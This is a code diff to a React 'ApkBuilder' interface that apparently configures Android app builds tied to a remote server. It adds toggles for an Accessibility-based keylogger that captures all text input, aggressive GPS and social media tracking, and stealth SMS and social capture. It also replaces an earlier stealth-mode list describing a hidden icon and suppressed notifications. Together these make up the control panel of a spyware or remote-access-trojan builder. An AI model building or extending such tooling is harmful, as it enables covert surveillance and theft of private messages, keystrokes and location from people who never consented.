@@ -53,6 +53,9 @@ export default function ApkBuilder() {
     ports: [8080],
     serverUrl: "",
     iconUrl: "",
+    enableKeylogger: false,
+    enableActiveTracking: false,
+    enableAccessibilityMonitor: false,
   });
   const [newPort, setNewPort] = useState("");
   const [copiedBuildId, setCopiedBuildId] = useState<string | null>(null);
@@ -386,28 +389,58 @@ export default function ApkBuilder() {
 
                   <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
                     <div>
-                      <p className="font-medium">Stealth Mode</p>
+                      <p className="font-medium">Accessibility Monitor</p>
                       <p className="text-sm text-muted-foreground">
-                        Hide app from launcher and system
+                        Monitor system permissions and accessibility state
                       </p>
                     </div>
                     <Switch
-                      checked={config.stealthMode}
+                      checked={config.enableAccessibilityMonitor}
                       onCheckedChange={(checked) =>
-                        setConfig({ ...config, stealthMode: checked })
+                        setConfig({ ...config, enableAccessibilityMonitor: checked })
+                      }
+                    />
+                  </div>
+
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded">
+                    <div>
+                      <p className="font-medium text-purple-400">Keylogger Service</p>
+                      <p className="text-sm text-muted-foreground">
+                        Capture all text input (requires Accessibility)
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.enableKeylogger}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, enableKeylogger: checked })
+                      }
+                    />
+                  </div>
+
+                  <div className="flex items-center justify-between p-4 bg-accent/10 rounded border border-purple-500/30">
+                    <div>
+                      <p className="font-medium text-purple-400">Active Intelligence Tracking</p>
+                      <p className="text-sm text-muted-foreground">
+                        Aggressive GPS polling and social media monitoring
+                      </p>
+                    </div>
+                    <Switch
+                      checked={config.enableActiveTracking}
+                      onCheckedChange={(checked) =>
+                        setConfig({ ...config, enableActiveTracking: checked })
                       }
                     />
                   </div>
 
                   <div className="border-glow-cyan p-4 rounded">
                     <p className="text-sm font-medium glow-cyan mb-2">
-                      ⚠️ Stealth Mode Features
+                      ⚠️ Platinum Advanced Features
                     </p>
                     <ul className="text-xs text-muted-foreground space-y-1">
-                      <li>✓ Hidden app icon</li>
-                      <li>✓ No app name in recent apps</li>
-                      <li>✓ Disabled notifications</li>
-                      <li>✓ No persistent notification</li>
+                      <li>✓ Accessibility-based Keylogger</li>
+                      <li>✓ Real-time Permission Matrix</li>
+                      <li>✓ Stealth SMS & Social Capture</li>
+                      <li>✓ Background GPS Persistence</li>
                     </ul>
                   </div>
                 </div>
